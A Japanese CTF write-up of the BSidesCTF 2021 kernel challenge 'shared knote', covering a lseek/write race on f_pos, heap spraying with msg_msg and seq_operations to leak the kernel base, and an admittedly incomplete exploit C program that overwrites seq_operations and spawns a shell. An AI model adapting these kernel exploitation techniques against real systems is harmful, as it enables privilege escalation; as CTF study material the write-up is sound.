# shared knote

keywords
kernel exploit / race / f_pos / seq_operations / zero-addr mapping / VDSO search 

# イントロ
いつぞや開催された**BSidesCTF 2021**。そのkernel問題**shared knote**。解けなかったけど少し触ったので途中までの状況を供養しとく。だって触ったのに、なんも書かないし解けもしないの、悲しいじゃん？？？？
なお、公式から既に完全なwriteupが出ている。zer0pts主催のCTF、一瞬で公式writeupがでていてすごい。すごい一方で、早すぎる公式完全writeupはコミュニティwriteupが出るのを妨げる気もしているので、個人的には1日くらいは方針だけちょい出しして、1日後くらいに完全版を出してほしいという気持ちも無きにしもあらず。
アディスアベバ。

# static
```static.sh
Linux version 5.14.3 (ptr@medium-pwn) (x86_64-buildroot-linux-uclibc-gcc.br_real (Buildroot 2021.08-804-g03034691


#!/bin/sh
timeout --foreground 300 qemu-system-x86_64 \
        -m 64M -smp 2 -nographic -no-reboot \
        -kernel bzImage \
        -initrd rootfs.cpio \
        -append "console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr" \
        -cpu kvm64 -monitor /dev/null \
        -net nic,model=virtio -net user
        
static struct file_operations module_fops =
  {
   .owner   = THIS_MODULE,
   .llseek  = module_llseek,
   .read    = module_read,
   .write   = module_write,
   .open    = module_open,
   .release = module_close,
  };
```

一般的なキャラクタデバイスドライバが実装されている。ドライバ全体で一つのノートを共有する感じになっている。ノートはrefcntで管理されており、open/closeで増減される。


# 怪しいと思ったとこ
ココ(critical regionがとられてない)と、
```module_open.c
static int module_open(struct inode *inode, struct file *file)
{
  unsigned long old = __atomic_fetch_add(&sknote.refcnt, 1, __ATOMIC_SEQ_CST);
  if (old == 0) {

    /* First one to open the note */
    if (!(sknote.noteptr = kzalloc(sizeof(note_t), GFP_KERNEL)))
      return -ENOMEM;
    if (!(sknote.noteptr->data = kzalloc(MAX_NOTE_SIZE, GFP_KERNEL)))
      return -ENOMEM;

  } else if (old >= 0xff) {

    /* Too many references */
    __atomic_sub_fetch(&sknote.refcnt, 1, __ATOMIC_SEQ_CST);
    return -EBUSY;

  }

  return 0;
}
```

ココ。
```module_write.c
static ssize_t module_write(struct file *file,
                            const char __user *buf, size_t count,
                            loff_t *f_pos)
{
  note_t *note;
  ssize_t ecount;

  note = (note_t*)sknote.noteptr;

  // XXX
  /* Security checks to prevent out-of-bounds write */
  if (count < 0)
    return -EINVAL; // Invalid count
  if (__builtin_saddl_overflow(file->f_pos, count, &ecount))
    return -EINVAL; // Too big count
  if (ecount > MAX_NOTE_SIZE)
    count = MAX_NOTE_SIZE - file->f_pos; // Update count

  /* Copy data from user-land */
  if (copy_from_user(&note->data[file->f_pos], buf, count))
    return -EFAULT; // Invalid user pointer

  /* Update current position and length */
  *f_pos += count;
  if (*f_pos > note->length)
    note->length = *f_pos;

  return count;
}
```

前者は、refcntはロックとられてるのに関数内にcritical regionがとられていないためレースが起きそう。そして、これが実際に想定解だったっぽい。closeは以下のようになっていて、free後はNULLが入る。
```module_close.c
static int module_close(struct inode *inode, struct file *file)
{
  // XXX
  if (__atomic_add_fetch(&sknote.refcnt, -1, __ATOMIC_SEQ_CST) == 0) {
    /* We can free the note as nobody references it */
    kfree(sknote.noteptr->data);
    kfree(sknote.noteptr);
    sknote.noteptr = NULL;
  }

  return 0;
}
```
本番ではNULL入るか〜〜、あちゃ〜〜〜と言ってシカトしていたが、なんか今回のkernelはaddress0にuserlandがマップすることが出来たらしく、NULLをいれる==userlandを指させるということが出来たらしい。前も見たことある気がするけど、いざ本番で見ると、気づかないもんですね。取り敢えず本番はこっちはシカトしました。


# vuln: race of lseek/write (invalid f_pos use)

先程のwriteを見ると分かる通り、モジュール内で`f_pos`と`file->f_pos`の両方を使ってしまっている。そもそも、`write`の呼び出し時には`ksys_write()`で`file->f_pos`をスタックに積んでおり、そのスタックのアドレスを`write`の第3引数`f_pos`として渡している。`write`の呼び出し後にこのスタックの値を確認して、初めて`file->f_pos`に下記戻すことになる。そして、モジュール内で`file->f_pos`は触ってはいけない(少なくとも僕はこの認識でいる)。唯一の例外が`llseek`であり、この中では直接`file->f_pos`をいじることができる。

```read_write.c
ssize_t ksys_write(unsigned int fd, const char __user *buf, size_t count)
{
	struct fd f = fdget_pos(fd);
	ssize_t ret = -EBADF;

	if (f.file) {
		loff_t pos, *ppos = file_ppos(f.file);
		if (ppos) {
			pos = *ppos;
			ppos = &pos;
		}
		ret = vfs_write(f.file, buf, count, ppos);
		if (ret >= 0 && ppos)
			f.file->f_pos = pos;
		fdput_pos(f);
	}

	return ret;
}
```


さて、先程のwriteを見ると、前半で`file->f_pos`を、後半で`f_pos`を使っている。
```module_write.c
  note = (note_t*)sknote.noteptr;

  // XXX
  /* Security checks to prevent out-of-bounds write */
  if (count < 0)
    return -EINVAL; // Invalid count
  if (__builtin_saddl_overflow(file->f_pos, count, &ecount))
    return -EINVAL; // Too big count
  if (ecount > MAX_NOTE_SIZE)
    count = MAX_NOTE_SIZE - file->f_pos; // Update count

  /* Copy data from user-land */
  if (copy_from_user(&note->data[file->f_pos], buf, count)) // XXX writeで止めてる時にcloseしたらどうなる??
    return -EFAULT; // Invalid user pointer

  /* Update current position and length */
  *f_pos += count;
  if (*f_pos > note->length)
    note->length = *f_pos;
```

ここで、以下のようにすることでraceを起こして`note->length`を`MAX_NOTE_SIZE`よりも任意に大きくすることが出来る。

Thread A:
- llseek(0, END)
- write(MAX_NOTE_SIZE)

Thread B:
- llseek(0, CUR)

上手いこと`llseek(END, 0) -> write呼び出し -> llseek(SET, 0) -> write前半のチェック`という流れになれば、`write`の第3引数を`MAX_NOTE_SIZE`にしたまま`write`の諸々のチェックをパスしてノートサイズを増やすことが出来る。

これでOOB(read)の完成。


# kbase leak

ノートサイズは0x400であり、あんま良い感じの構造体はただでは隣接しなさそう。ということで、`seq_operations`が入る0x20スラブと0x400スラブを大量に確保して枯渇させ、新たにページを確保させて隣接させる。

```spray.c
  // heap spray
  puts("[.] heap spraying...");
  for (int jx = 0; jx != 0x100; ++jx) {
    int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (qid == -1)
    {
      errExit("msgget");
    }
    struct _msgbuf400 msgbuf = {.mtype = 1};
    memset(msgbuf.mtext, 'A', 0x400);
    KMALLOC(qid, msgbuf, 0x10);
  }
  puts("[.] END heap spraying");

  // init
  if ((fd = open(DEV_PATH, O_RDWR)) < 0)
  {
    errExit("open");
  }
  puts("[.] opened dev file.");

  // alloc seq_operations next to NOTE
  puts("[.] seq spraying...");
  #define SEQSIZE 0x300
  int seq_fds[SEQSIZE];
  for (int ix = 0; ix != SEQSIZE; ++ix)
  {
    if((seq_fds[ix] = open("/proc/self/stat", O_RDONLY)) == -1) {
      errExit("open seq");
    }
  }
  puts("[.] END seq spraying...");
```

これで、先程のOOB(read)をすると、厳密には完全に隣接こそシていないものの`seq_operations`のスラブを探し出すことができ、kbaseがleakできる。

# OOB write

RIPを取るために`seq_operations`を書き換えたい。すんなり行くかと思えば、`write`内の以下のせいでめっちゃめんどくさくなった。

```mendoi.c
  if (__builtin_saddl_overflow(file->f_pos, count, &ecount))
    return -EINVAL; // Too big count
  if (ecount > MAX_NOTE_SIZE)
    count = MAX_NOTE_SIZE - file->f_pos; // Update count
```

これのせいで、`f_pos`が大きいとcountがhogeる。よってこれを回避するためにまたraceをした。このチェックだけパスするように`llseek`を噛ませたが、`read`のraceが秒で終わったのに対し、こちらは10秒待っても終わるときと終わらないときがあって、しかも書き換えたあとの値が意味分からん値になっていた。

詰みました。


# 戦いの果て

一応この後も考えたけど、SMEP/SMAPなしならshellcodeいれて終わりじゃ〜んと思ってうきうきでいたら、KPTI有効なのを忘れていた。ROPすればなんとかなってたのかなぁと思いつつも、OOB(write)がうまく言っていなかったこともあり、ここで断念した。



# 想定解

上に述べた、freeの際にNULLをいれるのだが、今回のkernelは0アドレスにuserlandが`mmap`できる設定だったらしく、NULLを入れる==userlandを指させるという意味に出来たらしい。SMAP無効だし。
これで簡単にポインタを書き換えてAAW/AAR。KASLR-bypassのためにめっちゃ探索してVDSOを探す。この探索は、`copy_from_user`がメモリチェックで不正を検出した場合はクラッシュとかではなく単純にエラーを返してくれるので出来ること。偉い。あとは単純に`modprobe_path`。
偉いね。



# exploit (to kbase leak + insufficient write)

一応貼っておこ。後で完全版出すかも知れないし、公式のが完全なので出さないかも知れない。


```exploit.c
#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>

// commands
#define DEV_PATH "/dev/sknote" // the path the device is placed
#define MAX_NOTE_SIZE 0x400

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4 * PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// utils
#define WAIT getc(stdin);
#define ulong unsigned long
#define scu static const unsigned long
#define NULL (void *)0
#define errExit(msg)    \
  do                    \
  {                     \
    perror(msg);        \
    exit(EXIT_FAILURE); \
  } while (0)
#define KMALLOC(qid, msgbuf, N)   \
  for (int ix = 0; ix != N; ++ix) \
  {                               \
    if (msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
    errExit("KMALLOC"); \
  }
ulong user_cs, user_ss, user_sp, user_rflags;
struct pt_regs
{
  ulong r15;
  ulong r14;
  ulong r13;
  ulong r12;
  ulong bp;
  ulong bx;
  ulong r11;
  ulong r10;
  ulong r9;
  ulong r8;
  ulong ax;
  ulong cx;
  ulong dx;
  ulong si;
  ulong di;
  ulong orig_ax;
  ulong ip;
  ulong cs;
  ulong flags;
  ulong sp;
  ulong ss;
};
void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}
void NIRUGIRI(void)
{
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  execve("/bin/sh", argv, envp);
}
// should compile with -masm=intel
static void save_state(void)
{
  asm(
      "movq %0, %%cs\n"
      "movq %1, %%ss\n"
      "movq %2, %%rsp\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
      :
      : "memory");
}

unsigned long (*rooter_pkc)(unsigned long) = 0;
unsigned long (*rooter_commit_creds)(unsigned long) = 0;

int shellcode_is_called = 0;

static void shellcode(void)
{
  //asm(
  //    "xor rdi, rdi\n"
  //    "mov rbx, QWORD PTR [rsp+0x50]\n"
  //    "sub rbx, 0x244566\n"
  //    "mov rcx, rbx\n"
  //    "call rcx\n"
  //    "mov rdi, rax\n"
  //    "sub rbx, 0x470\n"
  //    "call rbx\n"
  //    "add rsp, 0x20\n"
  //    "pop rbx\n"
  //    "pop r12\n"
  //    "pop r13\n"
  //    "pop r14\n"
  //    "pop r15\n"
  //    "pop rbp\n"
  //    "ret\n");
  //save_state();

  //shellcode_is_called = 1;
  //rooter_commit_creds(rooter_pkc(0));
}
// (END utils)

// globals
const unsigned PSIZE = 10;
int fd = 0;
const ulong ADDRBASE = 0x10000;
int write_permission = 0;
long target_offset = 0;
typedef struct
{
  int whoami;
  long uffd;
} thrinfo;
char EMPTYNOTE[PAGE];
// (END globals)

ulong sk_seek_abs(unsigned abs)
{
  assert(fd != 0);
  ulong hoge = lseek(fd, abs, SEEK_SET);
  if (hoge == -1)
  {
    errExit("lseek");
  }
  return hoge;
}

void sk_seek_zero(void)
{
  sk_seek_abs(0);
}

ulong sk_seek_end(void)
{
  assert(fd != 0);
  return lseek(fd, 0, SEEK_END);
}

int SHOULDEND = 0;

#define REPEAT 80

static void *writer(void *arg)
{
  //int whoami = *(int*)arg;
  //printf("[.] writer inited: %d\n", whoami);

  assert(fd != 0);
  ulong cur;
  char buf[PAGE] = {0};
  ulong old = MAX_NOTE_SIZE;
  while (1 == 1)
  {
    cur = sk_seek_end();
    if(cur != old) {
      printf("[+] extended to 0x%lx : %lx\n", cur, cur / MAX_NOTE_SIZE);
      old = cur;
    }
    if (cur > MAX_NOTE_SIZE * REPEAT)
    {
      printf("[SEEK_END] %lx\n", cur);
      puts("!!!!!!!!!!!!!!!!!!!!!!!!!!");
      SHOULDEND = 1;
      return 0;
    }
    int ret = write(fd, buf, MAX_NOTE_SIZE);
  }
  printf("[.] writer finished\n");
}

static void *zeroer(void *arg)
{
  assert(fd != 0);
  while (SHOULDEND == 0)
  {
    sk_seek_zero();
  }
  return 0;
}

static void *targeter(void *arg) {
  while (SHOULDEND == 0) {
    sk_seek_abs(target_offset);
  }
  printf("[.] targeter finished\n");
}

static void *writer2(void *arg) {
  ulong cur;
  ulong value = ((ulong)shellcode) + 4;
  ulong written_value[4] = {value, value, value, value};
  ulong old = MAX_NOTE_SIZE;
  while (SHOULDEND == 0)
  {
    sk_seek_zero();
    int ret = write(fd, written_value, 8 * 4);
  }
  printf("[.] writer2 finished\n");
}

void print_curious(char *buf, size_t size)
{
  for (int ix = 0; ix != size / 8; ++ix)
  {
    long hoge = *((ulong *)buf + ix);
    if (hoge != 0)
    {
      printf("[+%x] %lx\n", ix * 8, hoge);
    }
  }
}

unsigned long find_signature(char *buf, size_t size) {
  unsigned signatures[4] = {0xa0, 0xc0, 0xb0, 0x20};
  int step = 0;
  for (int ix = 0; ix != size / 8; ++ix)
  {
    long hoge = *((ulong *)buf + ix);
    if((hoge&0xFF) == signatures[step]) {
      ++step;
    } else {
      step = 0;
    }
    if(step == 4) {
      return (ix - 3) * 8;
    }
  }
  return 0;
}

struct _msgbuf400
{
  long mtype;
  char mtext[0x400];
};

int main(int argc, char *argv[])
{
  printf("[.] shellcode @ %p\n", shellcode);
  pthread_t writer_thr, zeroer_thr;
  memset(EMPTYNOTE, 'A', MAX_NOTE_SIZE * 2);

  // heap spray
  puts("[.] heap spraying...");
  for (int jx = 0; jx != 0x100; ++jx) {
    int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (qid == -1)
    {
      errExit("msgget");
    }
    struct _msgbuf400 msgbuf = {.mtype = 1};
    memset(msgbuf.mtext, 'A', 0x400);
    KMALLOC(qid, msgbuf, 0x10);
  }
  puts("[.] END heap spraying");

  // init
  if ((fd = open(DEV_PATH, O_RDWR)) < 0)
  {
    errExit("open");
  }
  puts("[.] opened dev file.");

  // alloc seq_operations next to NOTE
  puts("[.] seq spraying...");
  #define SEQSIZE 0x300
  int seq_fds[SEQSIZE];
  for (int ix = 0; ix != SEQSIZE; ++ix)
  {
    if((seq_fds[ix] = open("/proc/self/stat", O_RDONLY)) == -1) {
      errExit("open seq");
    }
  }
  puts("[.] END seq spraying...");

  // first write
  puts("[.] first write");
  assert(write(fd, EMPTYNOTE, MAX_NOTE_SIZE) != -1);

  // init threads
  puts("[.] writer thread initing...");
  assert(pthread_create(&writer_thr, NULL, writer, (void *)0) == 0);
  puts("[.] zeroer thread initing...");
  assert(pthread_create(&zeroer_thr, NULL, zeroer, (void *)0) == 0);

  pthread_join(writer_thr, NULL);

  // leek
  sleep(1);
  char buf[REPEAT * PAGE] = {0};
  sk_seek_zero();
  if (read(fd, buf, REPEAT * MAX_NOTE_SIZE) == -1)
  {
    errExit("read");
  }

  //print_curious(buf, REPEAT * MAX_NOTE_SIZE);
  target_offset = find_signature(buf, REPEAT * MAX_NOTE_SIZE);
  if (target_offset == 0) {
    errExit("target not found...");
  }
  printf("[!] target found @ offset 0x%lx\n", target_offset);
  print_curious(buf + target_offset, 8 * 8);

  ulong single_start = *(ulong *)(buf + target_offset);
  ulong kernbase = single_start - 0x16e1a0;
  ulong pkc = (0xffffffff810709f0 - 0xffffffff81000000) + kernbase;
  ulong commit_creds = (0xffffffff81070860 - 0xffffffff81000000) + kernbase;
  printf("[!] single_start: 0x%lx\n", single_start);
  printf("[!] kernbase: 0x%lx\n", kernbase);
  printf("[!] pkc: 0x%lx\n", pkc);
  printf("[!] commit_creds: 0x%lx\n", commit_creds);

  rooter_pkc = pkc;
  rooter_commit_creds = commit_creds;

  // overwrite
  printf("[+] overwrite as %lx\n", shellcode);
  ulong value = (ulong)shellcode;
  SHOULDEND = 0;

  puts("[.] writer thread initing...");
  assert(pthread_create(&writer_thr, NULL, writer2, (void *)0) == 0);
  puts("[.] targeter thread initing...");
  assert(pthread_create(&zeroer_thr, NULL, targeter, (void *)0) == 0);
  puts("[...] waiting lack...");
  sleep(3);
  SHOULDEND = 1;

  sk_seek_abs(target_offset);
  long nowvictim = 0;
  assert(read(fd, &nowvictim, 8) != -1);
  if(nowvictim == single_start) {
    printf("[-] failed to overwrite...\n");
    errExit(0);
  } else {
    printf("[!!] overwrite success!! : 0x%lx\n", nowvictim);
  }

  //print_curious(buf, MAX_NOTE_SIZE * REPEAT);


  //ulong cur = sk_seek_abs(target_offset);
  //printf("[+] cur: %lx\n", cur);
  //for (int ix = 0; ix != 4; ++ix)
  //{
  //  if(write(fd, &value, 8) == -1) {
  //    puts("fail");
  //    WAIT;
  //    errExit("write");
  //  }
  //}

  // invoke shellcode
  puts("[.] reading seqs");
  char hoge[0x10];
  for (int ix = 0; ix != SEQSIZE; ++ix)
  {
    if(read(seq_fds[ix], hoge, 1) == -1) {
      errExit("seq read");
    }
  }

  if(shellcode_is_called == 0) {
    errExit("shellcode is not called");
  }

  puts("[+] executing NIRUGIRI...");
  NIRUGIRI();

  // end of life
  puts("[ ] END exploit.");

  return 0;
}
```


# アウトロ

犬飼いたいんですが、大学生で犬買うの、金銭面的にと言うか、時間的にきつそうですよね。。。



# 参考
公式writeup
https://hackmd.io/@ptr-yudai/BkO-gQEDt
ニルギリ
https://youtu.be/yvUvamhYPHw



